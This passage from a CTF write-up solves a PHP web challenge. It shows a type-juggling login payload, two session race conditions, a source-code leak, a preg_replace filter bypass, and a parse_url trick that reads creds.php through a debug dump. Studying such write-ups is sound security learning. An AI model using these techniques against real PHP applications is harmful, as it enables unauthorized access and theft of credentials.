+Cookie: PHPSESSID=PHPSESSID-COOKIE
+
+username[]=whatever&amp;password=240610708&amp;d56b699830e77ba53855679cb1d252da=whatever
+</code></pre><p>But we aren’t ready to get into the second stage ;)</p>
+<hr/>
+<h3 id="race-conditions">Race Conditions</h3>
+<p>I haven’t much experience exploiting Race Conditions, so <a href="https://en.wikipedia.org/wiki/Race_condition" target="_blank">here</a> is a post about it in a generic way. What I understand about it is that it is achieved when the program flow and its threads are not propperly configured to work together.</p>
+<p>What I did in this part is not an actual Race Condition, but tends to be exploited the same way.</p>
+<p>(Code not complete)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>])) {
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: manager.php&#34;</span>);
+} <span style="color:#66d9ef">else</span> {
+    $_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;oooooumama&#34;</span>;
+    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>); <span style="color:#75715e"># No bruteforce :)
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">unset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>]);
+}
+</code></pre></div><p>In this piece of code, it is seen whether the “password” field of the <a href="https://www.w3schools.com/php/php_sessions.asp" target="_blank">php session</a> array is set. To get into “manager.php”, two requests have to be sent, and the second before the first finishes.</p>
+<p>Complete flow (Not ordered code):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>])) <span style="color:#75715e"># Is the session field set?
+</span><span style="color:#75715e"># Nope -&gt;
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">else</span> {
+    $_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;oooooumama&#34;</span>; <span style="color:#75715e"># Okay so lets fill the session field!
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>); <span style="color:#75715e"># Waiting two seconds!
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># (Meanwhile) Another request
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>])) <span style="color:#75715e"># Is the session field set?
+</span><span style="color:#75715e"># Yep!
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: manager.php&#34;</span>); <span style="color:#75715e"># Tells the browser to get into manager.php
+</span></code></pre></div><p>And we are in!</p>
+<p>This flow could be bypassed if manager.php didn’t check the session propperly, but it does ;)</p>
+<hr/>
+<h1 id="second-stage">Second stage</h1>
+<p>When we we into manager.php without being authenticated (outside the two seconds waiting moment), we get this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>])){ <span style="color:#75715e"># Is NOT the session field set?
+</span><span style="color:#75715e"># Yeap! -&gt;
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php?n1c3trY!&#34;</span>); <span style="color:#75715e"># Bye Bye!
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">die</span>();
+</code></pre></div><p>But if we got in inside the two seconds sleep function…</p>
+<p>(Not complete code)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>])){ <span style="color:#75715e"># Is NOT the session field set?
+</span><span style="color:#75715e"># Nope! -&gt; 
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;letmein&#39;</span>)])){ <span style="color:#75715e"># Is NOT this param set?
+</span><span style="color:#75715e"></span>            <span style="color:#75715e"># Yeap! -&gt;
+</span><span style="color:#75715e"></span>            $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#a6e22e">basename</span>($_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>])))); <span style="color:#75715e"># Source code leak!
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php?Have_a_nice_day!</span><span style="color:#e6db74">$content</span><span style="color:#e6db74">&#34;</span>); <span style="color:#75715e"># Bye Bye
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">die</span>();
+        }
+}
+</code></pre></div><p>Now we have manager.php’s code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#39;creds.php&#39;</span>; <span style="color:#75715e"># Including user, pwd and flag variables
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">session_start</span>();
+
+<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>])){
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php?n1c3trY!&#34;</span>);
+    <span style="color:#66d9ef">die</span>();
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;letmein&#39;</span>)])){
+        $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#a6e22e">basename</span>($_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]))));
+        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php?Have_a_nice_day!</span><span style="color:#e6db74">$content</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">die</span>();
+    }
+}
+
+<span style="color:#75715e"># Secret Method
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">sha1</span>($_POST[<span style="color:#e6db74">&#39;s3cr3t&#39;</span>])) <span style="color:#f92672">===</span> <span style="color:#a6e22e">sha1</span>($pwd)) {
+    <span style="color:#66d9ef">echo</span> $flag;
+}
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;debug&#39;</span>])) { <span style="color:#75715e"># Just for debugging
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">var_dump</span>($_SESSION);
+    <span style="color:#66d9ef">die</span>();
+}
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#a6e22e">sha1</span>($_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>])])) {
+
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>], <span style="color:#e6db74">&#34;/&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>){
+        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;What you trynna do¿?¿?&#34;</span>);
+    }
+
+    $_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>($_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>]);
+
+    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">300</span>; <span style="color:#f92672">++</span>$i) {
+        $_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/ph/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/ed/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/cr/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>])));
+    }
+
+    $url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span> <span style="color:#f92672">.</span> $_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.txt&#39;</span>;
+
+    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url)[<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;dXNlcg==&#34;</span>)];
+    $check <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url)[<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;cGFzcw==&#34;</span>)];
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($file)) {
+        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Get out of here!&#34;</span>);
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($check)) {
+            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Come and have a seat.&#34;</span>);
+        }
+    }
+
+    $_SESSION[<span style="color:#e6db74">&#39;info&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($file));
+    <span style="color:#a6e22e">session_write_close</span>();
+    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>); <span style="color:#75715e"># Bye bye bruteforce
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">0.337</span>); <span style="color:#75715e"># l33t
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">session_start</span>();
+    <span style="color:#a6e22e">unset</span>($_SESSION[<span style="color:#e6db74">&#39;info&#39;</span>]);
+
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Beep Boop!&#34;</span>);
+}
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;html style=&#34;background-image: url(&#39;img.jpg&#39;);&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;title&gt;SuperSecureVault&lt;/title&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;h1 style=&#34;color: white;&#34;&gt;&lt;center&gt;Mike&#39;s Manager doing management stuff&lt;/center&gt;&lt;/h1&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;p1 style=&#34;color: white;&#34;&gt;&lt;center&gt;Hi h4x0r, you are almost there! (Well, this is a self message as nobody will get here :P)&lt;center&gt;&lt;/p1&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;br&gt;&lt;hr&gt;&lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;form method=&#34;post&#34; action=&#34;&lt;?php basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34; name=&#34;give me flagg&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;form-element&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;label style=&#34;color: white;&#34;&gt;What you wanna do?&lt;/label&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;br&gt;&lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;input type=&#34;password&#34; name=&#34;yourinput&#34; required /&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;br&gt;&lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;button type=&#34;submit&#34; name=&#34;gooooooo&#34; value=&#34;mikeisthebest&#34;&gt;Log In&lt;/button&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;/form&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></code></pre></div><p>As you can see, there’s a secret method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># Secret Method
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">sha1</span>($_POST[<span style="color:#e6db74">&#39;s3cr3t&#39;</span>])) <span style="color:#f92672">===</span> <span style="color:#a6e22e">sha1</span>($pwd)) {
+    <span style="color:#66d9ef">echo</span> $flag;
+}
+</code></pre></div><p>But this wont ever be possible, because strict comparison is being used and the length of MD5 is different from the SHA1’s.</p>
+<hr/>
+<h3 id="preg_replace-bypass">preg_replace “bypass”</h3>
+<p>To understand how to “bypass” <a href="https://www.php.net/manual/es/function.preg-replace.php" target="_blank">preg_replace</a>, the way it works must be known.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/a/&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;whateverapple&#34;</span>));
+<span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">11</span>) <span style="color:#e6db74">&#34;whteverpple&#34;</span>
+</code></pre></div><p>manager.php just does the same but 300 times and replaces “cr”, “ed” and “ph”.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">300</span>; <span style="color:#f92672">++</span>$i) {
+    $_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/ph/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/ed/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/cr/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $_POST[<span style="color:#e6db74">&#39;yourinput&#39;</span>])));
+}
+</code></pre></div><p>Python will perfectly do our task: (Example)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#960050;background-color:#1e0010">$</span> python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print(&#34;c&#34;*301+&#34;r&#34;*301)&#39;</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr&#34;</span>;
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">300</span>; <span style="color:#f92672">++</span>$i) {
+<span style="color:#a6e22e">php</span> { $str <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/cr/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $str);}
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>($str);
+<span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">2</span>) <span style="color:#e6db74">&#34;cr&#34;</span>
+</code></pre></div><hr/>
+<h3 id="parse_url-understanding">parse_url understanding</h3>
+<p>To propperly pass this part of the stage, we have to know how <a href="https://www.php.net/manual/es/function.parse-url.php" target="_blank">parse_url</a> function works.</p>
+<p>(Summary)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">8</span>) {
+  [<span style="color:#e6db74">&#34;scheme&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;http&#34;</span>
+  [<span style="color:#e6db74">&#34;host&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">8</span>) <span style="color:#e6db74">&#34;hostname&#34;</span>
+  [<span style="color:#e6db74">&#34;port&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">int</span>(<span style="color:#ae81ff">9090</span>)
+  [<span style="color:#e6db74">&#34;user&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">8</span>) <span style="color:#e6db74">&#34;username&#34;</span>
+  [<span style="color:#e6db74">&#34;pass&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">8</span>) <span style="color:#e6db74">&#34;password&#34;</span>
+  [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">5</span>) <span style="color:#e6db74">&#34;/path&#34;</span>
+  [<span style="color:#e6db74">&#34;query&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">9</span>) <span style="color:#e6db74">&#34;arg=value&#34;</span>
+  [<span style="color:#e6db74">&#34;fragment&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">6</span>) <span style="color:#e6db74">&#34;anchor&#34;</span>
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://jorge:hunter2@jorgectf.gitlab.io:1337/index.php?next=value#partone&#34;</span>;
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">parse_url</span>($url));
+<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">8</span>) {                                                                              
+  [<span style="color:#e6db74">&#34;scheme&#34;</span>]<span style="color:#f92672">=&gt;</span>                                                                                 
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;http&#34;</span>                                                                             
+  [<span style="color:#e6db74">&#34;host&#34;</span>]<span style="color:#f92672">=&gt;</span>                                                                                                   
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">18</span>) <span style="color:#e6db74">&#34;jorgectf.gitlab.io&#34;</span>                                                                              
+  [<span style="color:#e6db74">&#34;port&#34;</span>]<span style="color:#f92672">=&gt;</span>                                                                                                   
+  <span style="color:#a6e22e">int</span>(<span style="color:#ae81ff">1337</span>)                                                                                                    
+  [<span style="color:#e6db74">&#34;user&#34;</span>]<span style="color:#f92672">=&gt;</span>                                                                                                                  
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">5</span>) <span style="color:#e6db74">&#34;jorge&#34;</span>                                                                                                           
+  [<span style="color:#e6db74">&#34;pass&#34;</span>]<span style="color:#f92672">=&gt;</span>                                                                                                                  
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">7</span>) <span style="color:#e6db74">&#34;hunter2&#34;</span>                                                                                                         
+  [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>                                                                                                                         
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">10</span>) <span style="color:#e6db74">&#34;/index.php&#34;</span>                                                                                                            
+  [<span style="color:#e6db74">&#34;query&#34;</span>]<span style="color:#f92672">=&gt;</span>                                                                                                                                
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">10</span>) <span style="color:#e6db74">&#34;next=value&#34;</span>                                                                                                                    
+  [<span style="color:#e6db74">&#34;fragment&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">7</span>) <span style="color:#e6db74">&#34;partone&#34;</span>
+}
+</code></pre></div><p>(Challenge code) (Not complete)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;dXNlcg==&#34;</span>));
+<span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;user&#34;</span>
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;cGFzcw==&#34;</span>));
+<span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;pass&#34;</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url)[<span style="color:#e6db74">&#34;user&#34;</span>];
+$check <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url)[<span style="color:#e6db74">&#34;pass&#34;</span>];
+
+<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($file)) {
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Get out of here!&#34;</span>);
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($check)) {
+        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Come and have a seat.&#34;</span>);
+    }
+}
+</code></pre></div><p>The values “user” and “pass” of the url sent must be set to get into the next part.</p>
+<hr/>
+<h3 id="another-race-condition">Another Race Condition</h3>
+<p>(Not complete code)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$_SESSION[<span style="color:#e6db74">&#39;info&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($file));
+<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>);
+<span style="color:#a6e22e">unset</span>($_SESSION[<span style="color:#e6db74">&#39;info&#39;</span>]);
+</code></pre></div><p>The value “info” from the SESSION array will contain the contents of the file we have sent via <code>$file = parse_url($url)[&#34;user&#34;];</code>.</p>
+<p>Then, to get that information, we will have to get into this if statement:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;debug&#39;</span>])) {
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">var_dump</span>($_SESSION);
+    <span style="color:#66d9ef">die</span>();
+}
+</code></pre></div><p>If we get here before the 2 seconds sleep finishes, we will get creds.php contents if we set <code>$file = parse_url($url)[&#34;user&#34;];</code> to be it.</p>
+<hr/>
+<h1 id="the-end">The end</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">basename</span>($_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;creds.php&#34;</span>) {
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;$flag = &#34;flag{H4H4_K33P_Try1nG}&#34;&#39;</span>;
+    <span style="color:#66d9ef">die</span>();
+}
+
+$user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mike&#34;</span>;
+$pwd <span style="color:#f92672">=</span> <span style="color:#ae81ff">10932435112</span>;
+$flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag{try_to_pwn_it_;)}&#34;</span>;
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>This is the content in b64 we will get by doing all of the “things” I have just explained.</p>
+<hr/>
+<p>I hope you liked this post, and encourage you to give it a try at <a href="https://ctf.fwhibbit.es/register" target="_blank">https://ctf.fwhibbit.es/register</a></p>
+<p><a href="https://twitter.com/jorge_ctf" target="_blank">JorgeCTF</a>.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/ctr-writeup-blind_hacker/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Fwhibbit CTR (CTF): Solving Blind Hacker</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/cybex-writeup/">
+                  <span class="button__text">CybexCTF 2020 Writeup (Beep Boop, Potencial/Intensidad &amp; Unsafe Behaviour)</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
